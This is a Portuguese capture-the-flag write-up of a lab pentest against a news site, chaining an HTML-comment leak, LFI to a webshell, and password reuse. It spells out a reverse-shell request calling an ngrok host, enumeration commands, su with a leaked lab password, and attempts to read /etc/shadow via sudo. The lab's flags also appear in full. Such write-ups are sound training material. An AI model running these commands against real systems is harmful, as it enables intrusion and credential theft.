# Relatório Detalhado - CTF9

## Informações Gerais

**Data de Execução:** 14 de fevereiro de 2026  
**Alvo Principal:** 98.86.169.119 (ec2-98-86-169-119.compute-1.amazonaws.com)  
**Banco de Dados MySQL:** 13.220.129.145 (ec2-13-220-129-145.compute-1.amazonaws.com)  
**Total de Flags:** 3 flags encontradas de 4 
***Dica da plataforma:***"Ariel Cardoso respirou fundo antes de abrir o ticket. 

Recém-contratado como pentester na RedGuardSec, ele ainda estava naquela fase em que cada demanda parecia um labirinto sem fim. E essa não era qualquer demanda: a Rede Blogo, um dos maiores conglomerados de mídia do país, havia sofrido um ataque cibernético e vos queriam respostas rápidas. 

O alvo deste pentest era o site de notícias da Blogo. Oficialmente, o incidente tinha um culpado: um grupo relativamente novo chamado LightBringers, que vinha ganhando fama em fóruns e canais fechados por ataques chamativos contra gigantes como a Iuhoo e a Xesla. O padrão deles é de sempre alto impacto, mas uma sensação circunda você...algo incômodo de que há algo além...pois eles nunca vendiam os dados roubados ou realizavam defaces estravagantes, eles apenas deixam um arquivo de assinatura, um grupo bem peculiar... 

Ariel abriu a documentação enviada pela Blogo esperando encontrar o básico: timeline, indicadores, ao menos alguns logs. Mas o material era…vazio. 

Não havia trilhas. Não havia registros confiáveis do que aconteceu. Nenhuma evidência clara de por onde os atacantes entraram, nem do que fizeram depois. Para uma empresa tão abastada em recursos, a falta de investimento em segurança era quase absurda. 

O contato do cliente foi direto: 

“A gente precisa saber como eles entraram. E se eles ficaram aqui dentro.” 

Sem logs, sem telemetria, sem IDS, sem SIEM...Ariel estava praticamente no escuro, apenas suas habilidades o ajudaram agora.  

A missão é clara: tratar o ambiente como uma cena de crime onde alguém apagou as pegadas…e reconstruir o caminho mesmo assim. "
---

## 1. Reconhecimento Inicial

### 1.1 Scan de Portas (Nmap)

**Alvo:** 98.86.169.119

**Portas Abertas:**
- **Porta 25/tcp** - SMTP (filtrada)
- **Porta 80/tcp** - HTTP (aberta)
- **Porta 3306/tcp** - MySQL (aberta)

**Serviço Web:**
- Aplicação web "Blogo" - Site de notícias
- Endereço: ip fornecido pela plataforma (ip muda conforme o tempo acaba mas tudo que foi feito no ip anterior se mantem da mesma forma desde documentos a falhas)
**Banco de Dados MySQL:**
- **IP:** ip fornecido pela plataforma (ip muda conforme o tempo acaba mas tudo que foi feito no ip anterior se mantem da mesma forma desde documentos a falhas)
- **Versão:** MySQL 8.0.44-0ubuntu0.24.04.2
- **SSL:** Habilitado com certificado auto-gerado
- **Autenticação:** caching_sha2_password

### 1.2 Enumeração MySQL

**Usuários identificados pelo nmap:**
- root (sem senha - acesso negado)
- user
- netadmin
- test
- guest
- sysadmin
- administrator
- webadmin
- admin
- web

**Observação:** A maioria dos usuários listados não possui senha configurada, mas o acesso remoto foi bloqueado.

---

## 2. Exploração e Exploração de Vulnerabilidades

### 2.1 Flag 1: Informação Exposta em Comentário HTML

**Localização:** Página `noticias.php`  
**Tipo de Vulnerabilidade:** Informação Sensível Exposta  
**Severidade:** Baixa

**Descrição:**
A primeira flag foi encontrada diretamente comentada no código HTML da página `noticias.php`. Esta é uma vulnerabilidade comum onde informações sensíveis são deixadas em comentários HTML que podem ser visualizados através do código-fonte da página.

**Flag Encontrada:**
```
Solyd{9NewsNews!!!NothingWrongHereVerySecure!!!9}
```

**Localização no Código:**
O comentário HTML foi encontrado no código-fonte da página `noticias.php`:
```html
<!--Solyd{9NewsNews!!!NothingWrongHereVerySecure!!!9}-->
```

**Método de Descoberta:**
- Visualização do código-fonte da página `noticias.php`
- Inspeção de comentários HTML

**Recomendações:**
- Remover comentários que contenham informações sensíveis
- Implementar sanitização de comentários antes do deploy
- Usar ferramentas de análise estática de código

---

### 2.2 Flag 2: Local File Inclusion (LFI) e Shell Reversa

**Localização:** Raiz do sistema (`/flag.txt`)  
**Tipo de Vulnerabilidade:** Local File Inclusion (LFI) → Remote Code Execution (RCE)  
**Severidade:** Crítica

**Descrição:**
Foi identificada uma vulnerabilidade de Local File Inclusion (LFI) na aplicação web que permitiu a inclusão de arquivos locais e, posteriormente, a execução de código remoto através da criação de uma shell reversa.

**Flag Encontrada:**
```
Solyd{#!UhOh#!Y0uAr3In#!#941}
```

**Processo de Exploração:**

1. **Identificação do LFI:**
   - Exploração de parâmetros na URL que permitiam inclusão de arquivos
   - Teste de diferentes técnicas de path traversal

2. **Criação de Shell Reversa:**
   - Utilização do script `reverse_shell.sh` para estabelecer conexão reversa
   - Criação de arquivo PHP (`rev.php`) no servidor para manter acesso persistente
   - Estabelecimento de conexão via netcat na porta 4444

3. **Acesso ao Sistema:**
   - Shell reversa estabelecida como usuário `www-data`
   - Navegação até a raiz do sistema (`/`)
   - Leitura do arquivo `flag.txt` na raiz

**Comandos Executados:**
```bash
# Estabelecimento de shell reversa via webshell
http://ip/shell.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/0.tcp.sa.ngrok.io/PORTA+0%3E%261%27

# Após conexão estabelecida
nc -lnvp 4444
# Conexão recebida de 127.0.0.1:36838

# Navegação e leitura da flag
cd /../../../
cat /flag.txt
```

**Arquivos Criados:**
- `/var/www/blogo/rev.php` - Script PHP para shell reversa persistente
- `/var/www/blogo/shell.php` - Webshell existente (pertencente ao usuário mysql)

**Estrutura de Diretórios Descoberta:**
```
/var/www/blogo/
├── aetherpharma.png
├── back.zip
├── config/
│   └── config.php (contém credenciais do banco de dados)
├── festas-ano-novo.png
├── files/
├── index.html
├── noticias.php
├── rev.php (criado durante exploração)
├── shell.php (existente, pertencente ao usuário mysql)
├── test.php
└── test.txt (pertencente ao usuário mysql)
```

**Informações do Sistema:**
- **Sistema Operacional:** Linux ip-10-0-3-227 6.8.0-1021-aws #23-Ubuntu SMP Mon Dec 9 23:59:34 UTC 2024 x86_64
- **Ambiente:** Container Docker (evidência: arquivo `.dockerenv` na raiz)
- **Usuário Inicial:** www-data (uid=33, gid=33)
- **Grupos do www-data:** www-data (33), mysql (101)

**Enumeração de Segurança do Sistema:**

1. **Binários SUID Encontrados:**
   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ```
   Resultado:
   - `/usr/lib/polkit-1/polkit-agent-helper-1`
   - `/usr/lib/dbus-1.0/dbus-daemon-launch-helper`
   - `/usr/bin/mount`
   - `/usr/bin/chsh`
   - `/usr/bin/newgrp`
   - `/usr/bin/su`
   - `/usr/bin/umount`
   - `/usr/bin/gpasswd`
   - `/usr/bin/chfn`
   - `/usr/bin/passwd`
   - `/usr/bin/sudo`

2. **Capabilities Encontradas:**
   ```bash
   getcap -r / 2>/dev/null
   ```
   Resultado:
   - `/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper` com capabilities: `cap_net_bind_service,cap_net_admin,cap_sys_nice=ep`

3. **Diretórios Graváveis:**
   ```bash
   find / -writable -type d 2>/dev/null
   ```
   Resultado:
   - `/tmp`
   - `/dev/mqueue`
   - `/dev/shm`
   - `/var/lib/php/sessions`
   - `/var/cache/apache2/mod_cache_disk`
   - `/var/tmp`
   - `/var/log/below`
   - `/var/www/blogo`
   - `/var/www/blogo/config`
   - `/var/www/blogo/files`
   - `/run/lock`
   - `/run/lock/apache2`
   - `/run/apache2/socks`

4. **Processos em Execução:**
   ```bash
   ps aux | grep root
   ```
   Resultado:
   - `root` (PID 1): `/bin/bash` - processo principal do container
   - `root` (PID 26): `/usr/sbin/apache2 -k start` - servidor web Apache

5. **Acesso ao Diretório MySQL:**
   Tentativas de acesso ao diretório `/var/lib/mysql` falharam devido a permissões insuficientes, mesmo com o usuário `www-data` pertencendo ao grupo `mysql`.

**Melhoria de Shell:**
```bash
# Estabelecimento de pseudo-TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
script -qc /bin/bash /dev/null

# Ajuste do terminal
export TERM=xterm
stty rows 40 columns 120
```

**Recomendações:**
- Implementar validação rigorosa de parâmetros de entrada
- Usar whitelist de arquivos permitidos ao invés de permitir inclusão arbitrária
- Desabilitar funções perigosas do PHP (se aplicável)
- Implementar Web Application Firewall (WAF)
- Realizar auditorias regulares de código

---

### 2.3 Flag 3: Credenciais Expostas e Escalação de Privilégios

**Localização:** `/home/adalberto/flag.txt`  
**Tipo de Vulnerabilidade:** Credenciais Expostas → Escalação de Privilégios Horizontal  
**Severidade:** Alta

**Descrição:**
Após obter acesso ao sistema como `www-data`, foi descoberto um arquivo `back.zip` no diretório `/var/www/blogo/` que continha um arquivo `config.php` com credenciais do banco de dados. Essas credenciais foram reutilizadas para fazer login como o usuário `adalberto` no sistema.

**Flag Encontrada:**
```
Solyd{Its*Always*Easier*To*Have*One*Strong*Password}
```

**Processo de Exploração:**

1. **Descoberta de Credenciais:**
   ```bash
   cd /var/www/blogo
   unzip back.zip
   cat config/config.php
   ```

2. **Credenciais Extraídas:**
   ```php
   'db' => [
       'driver'  => 'mysql',
       'host'    => '127.0.0.1',
       'port'    => 3306,
       'name'    => 'blogodb',
       'user'    => 'blogodb',
       'pass'    => 'WPcmqw16ZmzO!5paSC4',
   ]
   ```

3. **Escalação de Privilégios:**
   - Tentativa de login como usuário `adalberto` usando a senha encontrada
   - Sucesso na autenticação (reutilização de senha)
   - Acesso ao diretório home do usuário `adalberto`
   - Leitura da flag em `/home/adalberto/flag.txt`

**Comandos Executados:**
```bash
# Navegação até o diretório home
cd /home
ls -la
# Descobriu: adalberto e ubuntu

# Estabelecimento de shell interativa
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Tentativa de login
su adalberto
Password: WPcmqw16ZmzO!5paSC4

# Acesso ao diretório do usuário
cd adalberto
cat flag.txt
```

**Observações Importantes:**
- A senha do banco de dados (`WPcmqw16ZmzO!5paSC4`) foi reutilizada como senha do usuário `adalberto`
- Esta é uma prática de segurança ruim conhecida como "reutilização de senha"
- O arquivo `back.zip` estava acessível publicamente no diretório web

**Estrutura do Diretório Home:**
```
/home/adalberto/
├── .bash_history
├── .bash_logout
├── .bashrc
├── .cargo/
├── .profile
├── .rustup/
└── flag.txt (pertencente a root, mas legível)
```

**Privilégios Sudo do Usuário adalberto:**

O usuário `adalberto` possui privilégios sudo limitados:

```bash
sudo -l
```

Resultado:
```
User adalberto may run the following commands on ip-10-0-3-227:
    (ALL : ALL) NOPASSWD: /usr/local/bin/below *, !/usr/local/bin/below --config*, !/usr/local/bin/below --debug*, !/usr/local/bin/below -d*
```

**Observações:**
- O usuário pode executar o comando `below` com privilégios root sem senha
- Restrições aplicadas: não pode usar `--config`, `--debug` ou `-d*`
- O comando `below` é uma ferramenta de monitoramento de sistema (versão 0.8.1)
- Tentativas de exploração deste privilégio para escalação adicional foram realizadas, mas não resultaram em acesso root

**Tentativas de Exploração do Comando `below`:**

Foram realizadas várias tentativas de usar o comando `below` para ler arquivos do sistema através do parâmetro `--snapshot`:

1. **Tentativa de criar snapshot:**
   ```bash
   sudo /usr/local/bin/below snapshot -b "1 min ago" -o /tmp/test.snap
   ```
   Resultado: Erro - diretório `/var/log/below/store` não existe

2. **Tentativas de usar `dump` com `--snapshot` para ler arquivos:**
   ```bash
   sudo /usr/local/bin/below dump --snapshot /etc/passwd system --begin "1 min ago"
   sudo /usr/local/bin/below dump --snapshot /root/flag.txt system --begin "1 min ago"
   sudo /usr/local/bin/below dump --snapshot /etc/shadow system --begin "1 min ago"
   ```
   Resultado: Erros de parsing - o comando espera um formato específico de snapshot, não arquivos arbitrários

**Conclusão:** O comando `below` não pode ser explorado diretamente para leitura de arquivos arbitrários devido às suas validações internas e formato específico de dados.

**Arquivo de Configuração Sudoers:**
- Localização: `/etc/sudoers.d/adalberto-below`
- Permissões: `-r--r-----` (root:root)
- Conteúdo não acessível diretamente devido a permissões restritivas
- Configuração específica permite execução do comando `below` com restrições

**Recomendações:**
- Implementar políticas de senha únicas para cada serviço/usuário
- Não armazenar backups com credenciais em diretórios acessíveis via web
- Usar variáveis de ambiente ou serviços de gerenciamento de segredos
- Implementar rotação de senhas regular
- Usar autenticação de dois fatores quando possível
- Remover arquivos de backup de diretórios web públicos

---

### 2.4 Exploração do Banco de Dados MySQL

**Tipo de Vulnerabilidade:** Configuração Restritiva de Banco de Dados  
**Severidade:** Informacional

**Descrição:**
Após obter acesso ao sistema via shell reversa, foi realizada exploração do banco de dados MySQL para identificar possíveis informações sensíveis ou configurações que pudessem levar à descoberta de flags adicionais.

**Informações do Banco de Dados:**
- **IP Remoto:** ip fornecido pela plataforma (ip muda conforme o tempo acaba mas tudo que foi feito no ip anterior se mantem da mesma forma desde documentos a falhas)
- **IP Local:** 127.0.0.1 (no servidor comprometido)
- **Porta:** 3306
- **Versão:** MySQL 8.0.44-0ubuntu0.24.04.2
- **Database:** blogodb (configurada, mas não acessível)
- **Usuário:** blogodb
- **Senha:** WPcmqw16ZmzO!5paSC4
- **SSL:** Habilitado (certificado auto-gerado)
- **Autenticação:** caching_sha2_password
- **Data Directory:** /var/lib/mysql/

**Tentativas de Conexão Remota:**
Tentativas de conexão remota direta ao MySQL falharam devido a:
- Configuração que aceita apenas conexões locais (127.0.0.1)
- Erro de SSL (certificado auto-gerado): `ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain`
- Acesso negado para usuários remotos: `ERROR 1045 (28000): Access denied for user 'root'@'179.249.64.197'`

**Conexão Local via Shell Reversa:**

Conexão bem-sucedida estabelecida através da shell reversa no servidor:

```bash
mysql --protocol=TCP -h 127.0.0.1 -u blogodb -p
Enter password: WPcmqw16ZmzO!5paSC4
```

**Resultados da Exploração:**

1. **Listagem de Databases:**
   ```sql
   SHOW DATABASES;
   ```
   Resultado:
   - `information_schema`
   - `performance_schema`
   
   **Observação:** O banco `blogodb` não apareceu na listagem, indicando que o usuário `blogodb` não possui privilégios para acessá-lo ou o banco não existe.

2. **Verificação de Privilégios:**
   ```sql
   SHOW GRANTS FOR CURRENT_USER;
   ```
   Resultado:
   ```
   GRANT USAGE ON *.* TO `blogodb`@`localhost`
   ```
   
   **Observação:** O usuário possui apenas privilégio `USAGE`, que não permite acesso a databases específicos ou execução de operações.

3. **Diretório de Dados:**
   ```sql
   SHOW VARIABLES LIKE 'datadir';
   ```
   Resultado: `/var/lib/mysql/`
   
   Tentativas de acesso ao diretório falharam devido a permissões insuficientes.

**Conclusão:**
O usuário `blogodb` possui credenciais válidas, mas privilégios extremamente limitados no MySQL. Apenas privilégio `USAGE` foi concedido, impedindo acesso a qualquer database específico, incluindo o `blogodb` mencionado no arquivo de configuração. Esta configuração restritiva impede a exploração adicional do banco de dados através deste usuário.

---

## 3. Análise de Vulnerabilidades Identificadas

### 3.1 Resumo de Vulnerabilidades

| # | Vulnerabilidade | Severidade | Impacto | Status |
|---|----------------|------------|---------|--------|
| 1 | Informação Sensível em Comentários HTML | Baixa | Exposição de flag | ✅ Explorada |
| 2 | Local File Inclusion (LFI) | Crítica | RCE, Acesso ao Sistema | ✅ Explorada |
| 3 | Credenciais Expostas em Backup | Alta | Escalação de Privilégios | ✅ Explorada |
| 4 | Reutilização de Senhas | Alta | Comprometimento de Múltiplos Sistemas | ✅ Explorada |
| 5 | Arquivo de Backup Acessível Publicamente | Média | Exposição de Credenciais | ✅ Explorada |
| 6 | Webshell Existente no Sistema | Crítica | Backdoor Persistente | ⚠️ Identificada |
| 7 | Privilégios Sudo Limitados Mal Configurados | Média | Possível Vetor de Escalação | ⚠️ Identificada |
| 8 | Privilégios MySQL Restritivos | Baixa | Limitação de Acesso ao Banco | ✅ Explorada |

### 3.2 Análise Detalhada

#### Vulnerabilidade 1: Informação Sensível em Comentários
- **CVSS Score Estimado:** 2.0 (Baixo)
- **Vetor de Ataque:** Remoto
- **Complexidade:** Baixa
- **Impacto:** Exposição de informação

#### Vulnerabilidade 2: Local File Inclusion
- **CVSS Score Estimado:** 9.8 (Crítico)
- **Vetor de Ataque:** Remoto
- **Complexidade:** Baixa
- **Impacto:** Execução remota de código, acesso completo ao sistema

#### Vulnerabilidade 3: Credenciais Expostas
- **CVSS Score Estimado:** 7.5 (Alto)
- **Vetor de Ataque:** Remoto (após LFI)
- **Complexidade:** Baixa
- **Impacto:** Comprometimento de credenciais, acesso não autorizado

#### Vulnerabilidade 4: Reutilização de Senhas
- **CVSS Score Estimado:** 8.1 (Alto)
- **Vetor de Ataque:** Local (após comprometimento inicial)
- **Complexidade:** Baixa
- **Impacto:** Escalação de privilégios, acesso a múltiplos sistemas

---

## 4. Ferramentas e Técnicas Utilizadas

### 4.1 Ferramentas de Reconhecimento
- **Nmap:** Scan de portas e enumeração de serviços
- **Nmap Scripts:** mysql-info, mysql-enum, mysql-databases, mysql-users
- **Navegador Web:** Inspeção de código-fonte HTML

### 4.2 Ferramentas de Exploração
- **Netcat (nc):** Estabelecimento de shell reversa
- **Curl:** Testes de webshell e execução remota de comandos
- **Python3:** Estabelecimento de pseudo-TTY interativa
- **Scripts Customizados:** `reverse_shell.sh` para automação

### 4.3 Ferramentas de Pós-Exploração
- **LinPEAS:** Enumeração de escalação de privilégios
- **Comandos Nativos Linux:** Enumeração manual do sistema
- **MySQL Client:** Exploração do banco de dados MySQL
- **Below:** Ferramenta de monitoramento de sistema (versão 0.8.1)

---

## 5. Credenciais Descobertas

### 5.1 Banco de Dados MySQL
```
Host: 127.0.0.1 (local) / 13.220.129.145 (remoto)
Porta: 3306
Database: blogodb
Usuário: blogodb
Senha: WPcmqw16ZmzO!5paSC4
```

### 5.2 Usuário do Sistema
```
Usuário: adalberto
Senha: WPcmqw16ZmzO!5paSC4
```

**Observação:** Mesma senha reutilizada em múltiplos contextos.

### 5.3 Informações de Sistema
```
Hostname: ip-10-0-3-227 (varia entre sessões)
Sistema Operacional: Ubuntu (kernel 6.8.0-1021-aws)
Ambiente: Container Docker
Arquitetura: x86_64
```

---

## 6. Flags Capturadas

### Flag 1
```
Solyd{9NewsNews!!!NothingWrongHereVerySecure!!!9}
```
**Localização:** Comentário HTML em `noticias.php`  
**Método:** Inspeção de código-fonte

### Flag 2
```
Solyd{#!UhOh#!Y0uAr3In#!#941}
```
**Localização:** `/flag.txt` (raiz do sistema)  
**Método:** LFI → RCE → Shell Reversa

### Flag 3
```
Solyd{Its*Always*Easier*To*Have*One*Strong*Password}
```
**Localização:** `/home/adalberto/flag.txt`  
**Método:** Credenciais Expostas → Escalação de Privilégios

### Flag 4
**Status:** Não encontrada

---

## 7. Recomendações de Segurança

### 7.1 Recomendações Imediatas (Críticas)

1. **Corrigir Vulnerabilidade de LFI:**
   - Implementar validação rigorosa de todos os parâmetros de entrada
   - Usar whitelist de arquivos permitidos
   - Implementar sanitização adequada

2. **Remover Webshells:**
   - Remover `/var/www/blogo/shell.php`
   - Remover `/var/www/blogo/rev.php`
   - Realizar varredura completa por backdoors

3. **Proteger Arquivos de Configuração:**
   - Remover `back.zip` do diretório web
   - Mover arquivos de configuração para fora do web root
   - Implementar permissões adequadas (chmod 640)

4. **Alterar Todas as Senhas:**
   - Alterar senha do usuário `adalberto`
   - Alterar senha do banco de dados `blogodb`
   - Implementar políticas de senha fortes e únicas

### 7.2 Recomendações de Médio Prazo

1. **Implementar WAF:**
   - Deploy de Web Application Firewall
   - Regras específicas para prevenir LFI/RFI

2. **Auditoria de Código:**
   - Revisão completa do código-fonte
   - Análise estática automatizada
   - Testes de penetração regulares

3. **Hardening do Sistema:**
   - Remover capabilities desnecessárias do container
   - Implementar princípio do menor privilégio
   - Configurar logging e monitoramento

4. **Gerenciamento de Segredos:**
   - Implementar serviço de gerenciamento de segredos (ex: HashiCorp Vault)
   - Usar variáveis de ambiente para credenciais
   - Implementar rotação automática de senhas

### 7.3 Recomendações de Longo Prazo

1. **Treinamento de Segurança:**
   - Treinamento da equipe de desenvolvimento
   - Conscientização sobre práticas seguras de codificação
   - Simulações de incidentes

2. **Monitoramento Contínuo:**
   - Implementar SIEM (Security Information and Event Management)
   - Alertas em tempo real para atividades suspeitas
   - Análise de logs regular

3. **Programa de Bug Bounty:**
   - Estabelecer programa de recompensas por bugs
   - Incentivar descoberta responsável de vulnerabilidades

---

## 8. Lições Aprendidas

1. **Nunca Deixar Informações Sensíveis em Comentários:** Comentários HTML podem ser facilmente visualizados através do código-fonte.

2. **Validação de Entrada é Crítica:** Vulnerabilidades como LFI podem levar a RCE completo do sistema.

3. **Reutilização de Senhas é Perigosa:** Uma senha comprometida pode levar ao comprometimento de múltiplos sistemas.

4. **Backups Devem Ser Protegidos:** Arquivos de backup não devem ser armazenados em diretórios acessíveis publicamente.

5. **Defesa em Profundidade:** Múltiplas camadas de segurança são necessárias para proteger sistemas críticos.

---

## 9. Conclusão

Este CTF demonstrou uma cadeia de vulnerabilidades que permitiu progressão desde a descoberta de informação exposta até a escalação de privilégios no sistema. As vulnerabilidades identificadas são comuns em ambientes de produção e destacam a importância de:

- Validação rigorosa de entrada
- Proteção adequada de credenciais
- Implementação de princípios de segurança em todas as camadas
- Monitoramento e resposta a incidentes

A exploração bem-sucedida de 3 flags demonstra a eficácia de uma abordagem sistemática de teste de penetração, começando com reconhecimento básico e progredindo através de exploração e pós-exploração. A quarta flag não foi localizada durante esta fase de exploração.

---

## 10. Anexos

### 10.1 Scripts Utilizados

**reverse_shell.sh:** Script automatizado para estabelecimento de shell reversa via webshell.

**shellreversa.txt:** Comandos e técnicas para melhorar shells reversas.

### 10.2 Arquivos de Referência

- `nmap` - Resultados completos do scan de portas
- `Mysql.txt` - Tentativas de conexão ao MySQL
- `credecial.txt` - Descoberta de credenciais
- `flags.txt` - Documentação das flags encontradas
- `linpeasAdalberto.txt` - Resultados da enumeração LinPEAS
- `98.86.169.119` - Código-fonte da página inicial
- `98.86.169.119-noticias-php` - Código-fonte da página de notícias


---

**Relatório Gerado em:** 14 de fevereiro de 2026  
**Autor:** Análise de CTF9  
**Versão:** 1.0
